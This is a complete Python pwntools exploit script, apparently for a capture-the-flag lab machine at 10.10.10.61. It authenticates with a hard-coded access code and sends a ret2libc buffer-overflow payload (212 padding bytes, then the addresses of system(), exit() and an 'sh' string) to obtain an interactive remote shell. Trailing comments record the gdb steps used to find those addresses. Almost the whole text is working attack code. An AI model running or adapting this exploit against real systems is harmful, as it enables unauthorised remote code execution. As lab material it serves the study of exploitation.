#!/usr/bin/env python2
# Author: Alamot
import time
import struct
from pwn import *
from subprocess import call

#context(os = 'linux', arch = 'i386')
DEBUG = False
RHOST = "10.10.10.61"
RPORT = 32812

if DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

def conv(num):
    return struct.pack("<I",num)

payload = "A" * 212
payload += conv(0xf7e4c060) # system()
payload += conv(0xf7e3faf0) # exit()
payload += conv(0xf7f6ddd5) # 'sh'

r = remote(RHOST, RPORT)
r.recvuntil("Enter Bridge Access Code: ")
r.sendline("picarda1")
r.recvuntil("Waiting for input: ")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()

'''
*** WE DO NOT WANT NULL BYTES (00) OR NEWLINES (0a) ***

(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e4c060 <system>

(gdb) print &exit
$2 = (<text variable, no debug info> *) 0xf7e3faf0 <exit>

find &system,+9999999,"/bin/sh"  
0xf7f70a0f #<---- THIS NOT GOOD. IT HAS NEWLINE (0a) #

# So we search for plain 'sh'
(gdb) find &system,+9999999,"sh"       
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
'''
